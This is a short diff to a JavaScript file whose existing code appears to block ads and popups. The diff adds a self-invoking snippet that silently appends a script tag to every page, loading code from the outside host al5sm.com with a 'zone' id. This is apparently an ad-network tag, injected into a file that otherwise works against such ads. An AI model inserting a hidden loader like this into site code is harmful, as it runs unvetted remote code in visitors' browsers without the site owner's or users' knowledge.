@@ -1,7 +1,12 @@
 "use strict";
 
+(function (s) {
+    s.dataset.zone = "11786783";
+    s.src = "https://al5sm.com/tag.min.js";
+})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement("script")));
+
 (function () {
-    const AD_HINT_RE = /(adsterra|advert|banner|sponsor|promo|popunder|popup|highperformanceformat|laptopchoose|invoke\.js)/i;
+    const AD_HINT_RE = /(adsterra|advert|banner|sponsor|promo|popunder|popup|highperformanceformat|laptopchoose|invoke\.js|al5sm)/i;
     const BLOCKED_SANDBOX_FLAGS = new Set(["allow-popups", "allow-popups-to-escape-sandbox"]);
     const STORAGE_KEY = "rift_ads_last_popup_at";
     const nativeOpen = typeof window.open === "function" ? window.open.bind(window) : null;
